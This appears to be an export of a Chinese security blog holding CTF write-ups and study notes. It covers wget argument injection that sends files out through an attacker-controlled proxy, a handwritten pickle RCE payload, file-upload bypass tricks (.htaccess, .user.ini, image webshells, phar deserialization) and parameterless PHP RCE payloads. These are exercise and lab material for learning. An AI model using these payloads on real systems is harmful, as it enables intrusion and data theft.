    true_argv<span class="token operator">=</span><span class="token punctuation">[</span>x <span class="token keyword">if</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">'--'</span><span class="token operator">+</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> argv<span class="token punctuation">]</span>
    image<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'image'</span><span class="token punctuation">]</span>
    command<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>true_argv<span class="token punctuation">)</span>
    command<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"-q"</span><span class="token punctuation">,</span><span class="token string">"-O"</span><span class="token punctuation">,</span><span class="token string">"-"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    command<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:8080/"</span><span class="token operator">+</span>image<span class="token punctuation">)</span>
    image_data <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>command<span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
    <span class="token keyword">return</span> image_data<span class="token punctuation">.</span>stdout
</code></pre>
<p>搜到的结果都是wget参数注入PHP写文件getshell的，这里没法用，赛后问的rmb神仙，是用http_proxy+post-file两个参数做到任意文件读<br>post-file选项可以指定发送请求时使用POST方法并携带指定的文件，proxy设置代理，因此只要把代理设置为自己的vps再用post-file把文件带出来就行了</p>
<p>因为参数选项开头不是<code>-</code>就会被加上<code>--</code>，所以要直接等于号赋值来加参数<br><code>argv=--post-file%3d/app/app.py&amp;argv=--execute%3dhttp_proxy%3dip:port</code><br>一开始觉得execute&#x3D;后面的内容又有一个等于号，应该用引号括起来，结果反复报错打不通，最后把引号去了反而通了</p>
<p>这里的限制还算是没抄，但是也不难，只允许用config模块内的属性，翻翻opcode看看怎么用就行了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">RestrictedUnpickler</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>Unpickler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">find_class</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> module <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">]</span> <span class="token operator">and</span> <span class="token string">"__"</span> <span class="token operator">not</span> <span class="token keyword">in</span> name<span class="token punctuation">:</span>
            <span class="token keyword">return</span> getattr<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>
        <span class="token keyword">raise</span> pickle<span class="token punctuation">.</span>UnpicklingError<span class="token punctuation">(</span><span class="token string">"global '%s.%s' is forbidden"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>module<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">restricted_loads</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Helper function analogous to pickle.loads()."""</span>
    <span class="token keyword">return</span> RestrictedUnpickler<span class="token punctuation">(</span>io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>config里面直接一个eval</p>
<pre class=" language-python"><code class="language-python">SECRET_KEY<span class="token operator">=</span><span class="token string">"On_You_fffffinddddd_thi3_kkkkkkeeEEy"</span>

notadmin<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"admin"</span><span class="token punctuation">:</span><span class="token string">"no"</span><span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username
        self<span class="token punctuation">.</span>data <span class="token operator">=</span> data

<span class="token keyword">def</span> <span class="token function">backdoor</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span>list<span class="token punctuation">)</span> <span class="token operator">and</span> notadmin<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"yes"</span><span class="token punctuation">:</span>
        s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>
        eval<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
</code></pre>
<p>先覆盖掉notadmin再调用backdoor命令执行就行，手写pickle环节，不过听说命令执行之后找不到flag，说是被删了，需要进行奇妙的内存操作<br>简单的进行变量值的覆盖和命令执行</p>
<pre><code>cconfig
notadmin
S&#39;admin&#39;
S&#39;yes&#39;
s0cconfig
backdoor
(](S&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;
etR.
</code></pre>
<p>后面的就是为了增加难度套的奇怪东西了，估计是源码一开头那个奇怪的readflag.so的操作<br>如果是读了删的经典操作可能能去proc里面翻到？剩下的奇怪操作我也就不了解了<br>因为一开始就卡在了wget读文件上，所以后来的步骤也不知道怎么打了</p>
<h2 id="emlcms"><a href="#emlcms" class="headerlink" title="emlcms"></a>emlcms</h2><p>www.zip给了源码，emlcms加了个目录，目录内容是一个curl的ssrf，但是压缩包里的目录实际上是访问不到的，意思是需要先找一个扫目录功能把这个目录扫出来？非常抽象</p>
<p>看到wp了，源码的某个角落里藏了个根目录下有hint.txt，然后这个cms有一个SQL注入可以读文件，hint.txt的内容就是那个ssrf文件的路径，ssrf扫端口在5000上找到一个ssti然后简单打通<br>好套！出题人牛逼！</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/1426/">express-validator 6.6.0 原型链污染分析</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>原型链污染</tag>
        <tag>pickle</tag>
      </tags>
  </entry>
  <entry>
    <title>文件上传</title>
    <url>/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html</url>
    <content><![CDATA[<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>全文以upload-lab为例展开</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180712092548-81b98800-8572-1.png" alt="upload-lab导图"></p>
<h2 id="关于上传的具体步骤"><a href="#关于上传的具体步骤" class="headerlink" title="关于上传的具体步骤"></a>关于上传的具体步骤</h2><p>首先在本地前端可能会经过一次js代码的检验，上传到服务器之后会先存在一个后缀为<code>.tmp</code>的临时文件，之后服务器会对上传的文件进行判断，最终使用<code>move_uploaded_file</code>函数将文件移动至标准路径，要注意使用该函数时路径由后台代码控制，最终储存的文件名不一定等于原文件名</p>
<h2 id="客户端的检验"><a href="#客户端的检验" class="headerlink" title="客户端的检验"></a>客户端的检验</h2><p>使用本地js代码进行判断，是非常弱的检验手段。<br>不仅可以在本地看见源码，还可以手动把源码直接修改掉，也可通过抓包修改的形式避开判断。</p>
<h3 id="客户端的捣乱"><a href="#客户端的捣乱" class="headerlink" title="客户端的捣乱"></a>客户端的捣乱</h3><p>有的时候上传的那个按钮属性会被设置为disable，查下代码手动改一改才能开始上传</p>
<h2 id="服务器端的检验"><a href="#服务器端的检验" class="headerlink" title="服务器端的检验"></a>服务器端的检验</h2><p>在服务器端进行检验，该过程发生在数据包发送以后</p>
<h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>禁止带有特定后缀名的文件上传，如.php，.asp等等</p>
<p>这里需要注意的是我们如果要直接访问我们上传的后门，其后缀必须得是php及其衍生格式才能被解析。<br>upload-labs中的后缀处理步骤为：</p>
<ol>
<li>去除文件名两端的空格</li>
<li>去除后缀最后的.</li>
<li>以最后一个点为标志位截取文件后缀</li>
<li>转为小写</li>
<li>去除后缀最后的::$DATA</li>
<li>修剪两端空格</li>
<li>将修剪后的文件名与黑名单进行对比</li>
</ol>
<h4 id="常见的PHP衍生格式"><a href="#常见的PHP衍生格式" class="headerlink" title="常见的PHP衍生格式"></a>常见的PHP衍生格式</h4><p>以upload-labs的第三关为例，这里过滤了.asp .aspx .php .jsp文件，我们可以使用PHP的衍生格式文件进行上传绕过。</p>
<ul>
<li>.php2</li>
<li>.php3</li>
<li>.php4</li>
<li>.php5</li>
<li>.php7</li>
<li>.phtml</li>
</ul>
<h4 id="大小写后缀绕过"><a href="#大小写后缀绕过" class="headerlink" title="大小写后缀绕过"></a>大小写后缀绕过</h4><p>有的题目检测的不是很上心，大小写混搭即可绕过</p>
<h4 id="增加空格绕过"><a href="#增加空格绕过" class="headerlink" title="增加空格绕过"></a>增加空格绕过</h4><p>有的检测是通过in_array函数实现的，并且是检测我们的后缀是否处于禁用列表之中，这时如果没有去除文件名后缀的空格，就可以完成绕过，如<code>.php    </code><br>注：upload-labs的第六关的显示源码和真正的源码不符，显示的源码中仍有trim函数，坑死我了</p>
<h4 id="Windows特性绕过"><a href="#Windows特性绕过" class="headerlink" title="Windows特性绕过"></a>Windows特性绕过</h4><p>只有在服务器是Windows系统下才有用的操作</p>
<h5 id="加-进行绕过"><a href="#加-进行绕过" class="headerlink" title="加.进行绕过"></a>加.进行绕过</h5><p>发生在没有对文件删除.的检测中，由于Windows的特性，会自动去除文件后缀名中最后的点，这样我们的加点后缀在检测中就是以<code>.php.</code>的形式进行检测，但上传之后.会被去除又变回<code>.php</code></p>
<h5 id="加-DATA绕过检测"><a href="#加-DATA绕过检测" class="headerlink" title="加::$DATA绕过检测"></a>加::$DATA绕过检测</h5><p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名，完成绕过</p>
<h5 id="使用原文件名作为新文件名"><a href="#使用原文件名作为新文件名" class="headerlink" title="使用原文件名作为新文件名"></a>使用原文件名作为新文件名</h5><p>以upload-labs第九题为例<br>一般来说服务器会将检测后的文件名作为上传文件的文件名进行保存，但是某些情况下会将原文件名进行保存，这时我们就可以利用这点构造进行绕过<br>例:<code>webshell.php. .</code>，通过Windows服务器特性即可绕过检测并可被解析，但如果储存的是处理过的文件名，此处被截取到的文件后缀将为空。</p>
<h4 id="被禁用后缀名替换为空"><a href="#被禁用后缀名替换为空" class="headerlink" title="被禁用后缀名替换为空"></a>被禁用后缀名替换为空</h4><p>同样的套路常见于SQL注入，双写绕过即可<br>例：<code>.phphpp</code></p>
<h4 id="禁止-lt"><a href="#禁止-lt" class="headerlink" title="禁止&lt;?"></a>禁止&lt;?</h4><p>可以使用<script language=php>  xxxxx  </script>这样的标签来进行定义，等价于<?php xxxx ?><br>该标准已在php7中禁用</p>
<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>只允许上传某些文件，如.jpg，.png等等，这时如何使我们上传的后门被解析是一个重点问题</p>
<h4 id="htaccess重定向"><a href="#htaccess重定向" class="headerlink" title=".htaccess重定向"></a>.htaccess重定向</h4><p>是Apache的配置文件，.htaccess文件规定了当前目录的应用规则，不同的目录下可以拥有不同的.htaccess文件规定不同的规则<br>这里用它将所有文件都解析为php文件就可以用上传后缀为.jpg的shell了<br>将所有文件解析为php的代码如下<br><code>SetHandler application/x-httpd-php</code><br>可后接文件后缀名使特定文件被解析为php<br>上传该内容的.htaccess文件即可以上传.jpg后缀的文件作为后门了<br>启用.htaccess文件需要在Apache配置中修改允许重写<br>.htaccess构成的后门：<a href="http://www.dengb.com/aqgjrj/961456.html">http://www.dengb.com/aqgjrj/961456.html</a></p>
<p>几个常见语句</p>
<ul>
<li>设置php变量 <code>php_value &lt;key&gt; &lt;val&gt;</code>  例如<code>php_value auto_append_file xxx.php</code> 该语句等价于在当前页面底端增加一句require(xxx.php)</li>
<li>更改解析方式 <code>SetHandler application/x-httpd-php .ext</code>，AddType语句和SetHandler一个效果，该语句规定将后缀为.ext的文件解析为php文件</li>
<li><code>php_flag engine off</code>，该语句命令当前目录下的所有文件都不可作为PHP脚本解析，当服务器存在该设置时可以考虑控制文件上传路径，使我们的shell放置在无.htaccess文件的地方</li>
<li><code>php_flag display_errors on</code>字面意思，显示错误</li>
<li><code>php_value zend.script_encoding “UTF-7″</code> 修改编码方式，要是我就用base64了</li>
</ul>
<h4 id="user-ini包含后门"><a href="#user-ini包含后门" class="headerlink" title=".user.ini包含后门"></a>.user.ini包含后门</h4><p>.user.ini文件中也有和htaccess一样的auto_append_file，并且相较于.htaccess，.user.ini存在于各种服务器之中，使用文件包含时，被包含的任何文件都会被解析为php文件，所以我们可以通过上传.user.ini文件再上传一个图片马，进行访问就可以进入后门了（当然需要一个正常的可访问php文件才能）<br>贴一个文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>
<h4 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h4><blockquote>
<p>适用情形：截断条件：php版本小于5.3.4，php的magic_quotes_gpc为OFF状态<br>因为对PHP版本要求过老，基本没用</p>
</blockquote>
<p>在上传的时候，当文件系统读到【0x00】时，会认为文件已经结束。利用00截断就是利用程序员在写程序时对文件的上传路径过滤不严格，产生0x00上传截断漏洞。<br>出现在上传路径可控的情况下，以get方式传递时可直接使用%00进行绕过，会自动进行url解码，以post方式执行时，需要在十六进制中对数据进行修改为00</p>
<h4 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h4><p>PHP存在一些判断文件类型的函数，通常就是看看文件头尾是不是符合图片的类型，这个时候我们可以把木马拼接在图片中，即可制造出一个图片马进行上传。<br>图片马是以.jpg形式上传的，使用就需要有文件包含，或是.htaccess，或者其他的解析漏洞。<br>图片马制作<code>copy 1.jpg /b + shell.php /a shell.jpg</code>，感觉直接在010editor里面拼也差不多<br>该方法可以绕过<code>getReailFileType</code>，<code>getimagesize</code>，<code>exif_imagetype</code>等函数检验</p>
<h5 id="exif-imagetype-绕过"><a href="#exif-imagetype-绕过" class="headerlink" title="exif_imagetype()绕过"></a>exif_imagetype()绕过</h5><p>可以在文件开头增加<code>GIF89a</code>来绕过<br><code>#define width 20</code><br><code>#define height 10</code><br>如上两行是xbm格式图片的开头，在上传.htaccess或是php脚本文件时将这两行添加进去可绕过exif_imagetype，并在解析时被作为注释，不影响脚本正常解析</p>
<h5 id="二次渲染绕过"><a href="#二次渲染绕过" class="headerlink" title="二次渲染绕过"></a>二次渲染绕过</h5><p>图片进行二次渲染之后可能会剔除我们之前拼接在图片中的脚本，并且对于.jpg，.png和.gif图片而言，处理二次渲染的方式并不一致</p>
<ul>
<li>.gif文件：.gif图片在进行二次渲染时存在二进制文件完全不变的部分，将代码插入该部分即可。</li>
<li>.png文件：很复杂，要分析数据块，将代码写入PLTE数据块并重新计算crc值修改，也可使用大佬的脚本</li>
<li>.jpg文件：使用大佬脚本进行填充，但部分jpg文件不存在可填充空间，所以需要多拿几张图片进行尝试<br>一篇写的很好的文章：<a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a> 脚本也贴在里面了</li>
</ul>
<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><p>发生在逻辑漏洞中，有的系统先将上传的文件进行保存再进行安全性检验，对于不通过的再予以删除，如果我们高频率对上传的文件进行访问，就有可能在其被删除之前访问到它，以此完成条件竞争<br>重复发包我们可以使用bp的intruder模块，随便自己加一个参数发起进攻即可，同时在浏览器反复尝试对上传的文件进行访问即可（需要知道上传的文件储存路径，并且文件名不要有变化）</p>
<h5 id="阻止文件改名"><a href="#阻止文件改名" class="headerlink" title="阻止文件改名"></a>阻止文件改名</h5><p>系统存在将上传的文件进行改名的操作，进行随机改名之后我们不知道被修改的文件名是什么，自然无法进行进一步的访问。如果也同条件竞争一样一直对服务器进行文件上传，就有机会访问到尚未未改名的文件（实测时发现最后竟然保留了一个未被改名的文件，不知道为什么）</p>
<h4 id="检测文件属性"><a href="#检测文件属性" class="headerlink" title="检测文件属性"></a>检测文件属性</h4><p>检测内容为文件的content-type，即文件属性。注意此处的content-type位于数据包中post的数据部分，不属于包的头部参数。<br>可以将文件名直接修改为<code>.jpg</code>然后抓包修改后缀为<code>.php</code>，或将<code>.php</code>文件的content-type修改为图片的<code>image/jpeg</code>即可绕过检测</p>
<h4 id="本地包含的文件上传"><a href="#本地包含的文件上传" class="headerlink" title="本地包含的文件上传"></a>本地包含的文件上传</h4><p>存在include等函数时，会将包含的文件当做PHP代码执行，所以如果有该函数，我们以此方式对上传的.jpg后缀文件进行访问也可正确解析。</p>
<h5 id="被限定后缀的本地包含"><a href="#被限定后缀的本地包含" class="headerlink" title="被限定后缀的本地包含"></a>被限定后缀的本地包含</h5><p>后台向文件包含位置增加一个.php后缀<br>这时可以使用php的phar伪协议，phar伪协议可以读取压缩包里的内容，我们可以将shell.php压缩为shell.zip，修改后缀为shell.jpg上传之后以phar伪协议进行读取，<code>?file=phar://upload/shell.jpg/shell</code>，这里最后一个shell会因为被添加一个.php被读取出来</p>
<h4 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h4><p>PHP新爆出的重大安全隐患，许多文件相关操作函数不经意间存在对phar文件的反序列化操作，使得我们精心设计的恶意数据将会得以导入</p>
<p>这种类型的漏洞需要源码进行代码审计，对__call,__construct等魔法方法着重关注，并且注意齐是否存在对文件操作函数的调用<br>zsx巨佬的博客<a href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a></p>
<h5 id="能够触发phar反序列化的函数"><a href="#能够触发phar反序列化的函数" class="headerlink" title="能够触发phar反序列化的函数"></a>能够触发phar反序列化的函数</h5><pre class=" language-php"><code class="language-php">fileatime <span class="token operator">/</span> filectime <span class="token operator">/</span> filemtime
stat <span class="token operator">/</span> fileinode <span class="token operator">/</span> fileowner <span class="token operator">/</span> filegroup <span class="token operator">/</span> fileperms
file <span class="token operator">/</span> file_get_contents <span class="token operator">/</span> readfile <span class="token operator">/</span> fopen`
file_exists <span class="token operator">/</span> is_dir <span class="token operator">/</span> is_executable <span class="token operator">/</span> is_file <span class="token operator">/</span> is_link <span class="token operator">/</span> is_readable <span class="token operator">/</span> is_writeable <span class="token operator">/</span> is_writable
parse_ini_file
unlink
copy
</code></pre>
<p>这么多的函数都可以在传入参数为phar:&#x2F;&#x2F;协议时对包含的数据进行反序列化，再通过一系列魔法方法形成pop链，完成入侵<br>在构造数据时也要注意自己的数据是什么时候被构造或析构，数据的显示应该通过什么方法进行等等。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>无参数RCE</title>
    <url>/%E6%97%A0%E5%8F%82%E6%95%B0RCE.html</url>
    <content><![CDATA[<h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><p>一道bytectf的题和一道GXYCTF的题，主要内容为bytectf的wp。两题均为无参数的命令执行，正则匹配如下</p>
<blockquote>
<p><code>/[a-z]+\((?R)?\)/</code><br><code>/[a-z,_]+\((?R)?\)/</code></p>
</blockquote>
<p>第一个较为严格，只允许纯字母函数的无参数调用。<br>第二个允许了下划线，和逗号，难度直线下降，允许了有参数的函数调用，即<code>a(b(),c())</code>，允许匹配到<code>,c()</code>这样子的函数名</p>
<p>(?R)表示引用当前正则表达式，?匹配一次或零次</p>
<h2 id="函数获取字符串"><a href="#函数获取字符串" class="headerlink" title="函数获取字符串"></a>函数获取字符串</h2><p>各种各样的神仙技巧，要求对各个函数的功能足够熟练才能做出来了，fuzz跑出内置函数然后做数学题或者各种各样的变换，我只能列一下学到的知识了</p>
<h3 id="获取’-’"><a href="#获取’-’" class="headerlink" title="获取’.’"></a>获取’.’</h3><h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>第一步，用chr(47)获取<code>.</code>，第二步，想办法无中生有一个数字出来，大佬的fuzz跑出来了一个phpversion函数，返回一个当前版本号，7.xxx，然后开始做数学题（我不太清楚这个数学题怎么做的）<br><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>这么大一串是47<br>这样子我们就可以访问当前目录了</p>
<h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>localeconv()函数返回数组的第一位是<code>.</code>，就能直接current(localeconv())拿到<br>数组操作有一系列的函数next(),currnt(),array_reverse()等，可以查询array相关函数获得很多信息，还可以利用array_flip()交换键值array_rand()获取随机键以取得任意数组元素</p>
<h4 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h4><p>用crypt函数对字符串进行加密，有概率在最后一位出现一个<code>.</code>，然后strrev翻转字符串，chr(ord())取得第一位，概率获得一个<code>.</code><br><code>chr(ord(strrev(crypt(($arg)))))</code>这里的arg好像是啥都行，数字，bool值都可以<br>所以用phpversion()也好，接着chdir()也好，都能用，就是概率性问题<br>还有见到用<code>serialize(array())</code>来获取字符串的</p>
<h3 id="跳完目录还得再获取一个’-’"><a href="#跳完目录还得再获取一个’-’" class="headerlink" title="跳完目录还得再获取一个’.’"></a>跳完目录还得再获取一个’.’</h3><p>需要chdir穿越目录之后再来一个<code>.</code>，chdir的返回值是一个布尔值true，大佬说用localtime(time(true))可以构造一个47出来，因为时间不同会随之变化，但是实际上我试的时候怎么试都是0，该方案只得作罢<br>否则如果成功穿越目录并scandir的话，可以继续使用next(),current(),end()等函数读取处于特定位置的文件<br>样例payload:<code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</code><br>又：本地测试时显示pos函数的返回值为空，查一下发现可以用current函数代替，不知道大佬是怎么做出来的</p>
<h3 id="跳目录与读文件分开的奇妙操作"><a href="#跳目录与读文件分开的奇妙操作" class="headerlink" title="跳目录与读文件分开的奇妙操作"></a>跳目录与读文件分开的奇妙操作</h3><p>可以用if()func()这样的语法执行跳目录，在if里面跳目录，然后chdir返回一个true，if语句就通过了，再在后面执行读文件，不得不说是非常高级的思路了（然而我读的时候没意识到正则还能这么匹配过去）<br>所以我们<code>if(chdir(..))readfile(scandir(.))</code>，根据scandir的情况选择用哪个函数读取处于哪个位置的文件</p>
<h2 id="本题payload"><a href="#本题payload" class="headerlink" title="本题payload"></a>本题payload</h2><p>以上部分均为bytectf的boring_code，这之前还有一层跳转的绕过，本题去掉了之前的一层又多加了几个过滤，把我们做数学题时用到的sqrt，获取第二个<code>.</code>的time，local，还有读文件的readfile和分开跳目录读文件的if给禁止了，可以用一些相关函数代替<br>if只是为了分开执行一下语句，我们用一个while也可以达到同样的效果，数学方法没得了就可以用之前提到的加密方法去做，不过存在了一定的随机性<br>readfile被禁止了可以用file函数代替，不同的是file函数会把文件分行读进一个数组里，print_r，var_dump带下划线不能用了，echo会输出Array，又是current，next，end几个函数读特定行<br>payload:<code>while(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))echo(next(file(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))))));</code></p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实看看禁用的列表也能得到部分出题人对这种绕过的思路<br>strlen就是一个获得数字的方法，info估计就能获得各种各样的字符了，rand生成随机数，bin，hex二进制十六进制应该也能整出数字来</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/">http://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1</title>
    <url>/%E6%8B%9F%E6%80%81&amp;L3H&amp;%E6%B7%B1%E8%82%B2&amp;%E6%B9%96%E6%B9%98&amp;%E8%A5%BF%E6%B9%96&amp;N1.html</url>
    <content><![CDATA[<h1 id="拟态-amp-L3H-amp-深育-amp-湖湘-amp-西湖-amp-N1"><a href="#拟态-amp-L3H-amp-深育-amp-湖湘-amp-西湖-amp-N1" class="headerlink" title="拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1"></a>拟态&amp;L3H&amp;深育&amp;湖湘&amp;西湖&amp;N1</h1><p>拟态决赛和L3H打不过，深育杯错过了没打，湖湘杯。。。妄图最后一个小时通过关积分榜的方式反抗诸神黄昏，然后直接打到诸神全灭，经典<br>西湖论剑做了一天牢，三个究极CMS审计血克我这种垃圾，唯一一个有希望的模板渲染也跑偏了。。。N1CTF也看了一眼题，除了签到只有一个看懂了呢</p>
<p>慢慢的看wp进行复现或者事后诸葛亮</p>
<h2 id="拟态决赛"><a href="#拟态决赛" class="headerlink" title="拟态决赛"></a>拟态决赛</h2><p>除了拟态环境N连外，还有两个题看了一下，都是做到最后一步做不出来了。。猛男落泪.jpg<br>黑盒看不懂，白盒要钱没人一起就没试过。总的来说是没体验到什么东西了</p>
<h3 id="拟态4连"><a href="#拟态4连" class="headerlink" title="拟态4连"></a>拟态4连</h3><p>这个题，说实话，做到最后一题的时候感觉出的还行，但是之前的部分完全脑溢血<br>四个题打开页面啥也没有，就注释里一行像base64的东西，但是base64解码还解不开。一开始一度卡在这，最后把misc爷爷叫了出来，他最后整了个变表base64解出来了。。。<br>用的这个网站<br><a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p>解出来之后就很好说了，base64的内容是三个api，让你去试这三个API</p>
<h4 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h4><p>只有一个能用，然后访问之后会回显一个step2的一个API访问，然后访问step2回显step3，访问step3获得flag。。。。说实话做到这的时候心态非常爆炸，我想说这是什么傻逼才能出出来的题</p>
<p>不过这里有一个比较奇怪的点，就是他的逻辑和普通的web服务不一样，他记录你的访问顺序，访问结果和访问顺序有关<br>你必须先访问API1再访问API2最后访问API3才能获取flag</p>
<h4 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h4><p>同1，三个API只有一个能用，然后step3回显了一个mimic shell，在http body处输啥执行啥。。。然后再给flag套了一层aes，看到了后端是用go写的，直接硬看go的二进制文件，找到密钥明文，解出flag</p>
<h4 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h4><p>同1，三个API只有一个能用，也是step3回显mimic shell，不过总算有点拟态的样子了。这把会发现有时候发过去的请求响应并不对，但重复几次之后似乎又会正确。思考了一下，感觉应该是存在了多个后端，并且每次的请求随机发放到某个后端，又因为在1中已经发现了请求是被记录的，和访问顺序有关，所以只要重复发送请求，每一个步骤确保能发送到那个可执行的后端即可</p>
<h4 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h4><p>脑洞大开的题，同样是三个API，有两个输入不会有任何反应，还有一个输入后会报错，显示后端比对结果不同，不予显示，并且似乎乱输入之前已知的api&#x2F;step2之类的路由，有时候会连续触发报错</p>
<p>仔细思考之后，这个就是拟态的概念，由多个异构后端同时执行输入，结果完全一致则返回，否则报警，存在多个后端，其中有一个能执行命令，然而执行命令时一定会出现不同的回显，从而导致报警。<br>并且还需要从之前三题中得到的规律去猜测命令执行的步骤应该是一致的，开始究极盲打命令执行</p>
<p>这里还有一个坑点，就是命令执行的步骤一定是回显不同的，因此并不能在命令执行的过程中进行判断（整个比赛都是在内网中举办的，不通外网，不同题目直接的网段都是隔离的），但是没试sleep。。。如果是每个执行结束再比对回显的话，也许sleep会方便一些</p>
<p>这个非常脑洞的思路是由老国王想出的，于是他通过逐位盲注flag，正确则修改index.html使得在正常情况下页面比较也不一致的方法，一位一位的盲注出了flag</p>
<h3 id="disable"><a href="#disable" class="headerlink" title="disable"></a>disable</h3><p>是一个全靠猜的奇怪题目，走到最后一步不会做了呜呜<br>给了三个参数<code>do think show</code>，也不说能干嘛，就嗯猜，最后我猜出来show是读文件，然后发现还有过滤，不给读php，最后再猜，猜出来是个文件包含（不要问我怎么猜出来的），然后用upload progress经典文件包含打通。<br>先看了眼phpinfo，好家伙，直接把他用过的以外的基本上所有函数都给干掉了，我本地拿get_defined_func和他的disable_function作比较，就留了几个curl系列函数和mail，putenv，问题是我写文件的函数都没有，怎么用mail和putenv打呢？研究了半天curl写文件，一无所获，不会了（并且本地比对出来的curl函数远程也不一定有）</p>
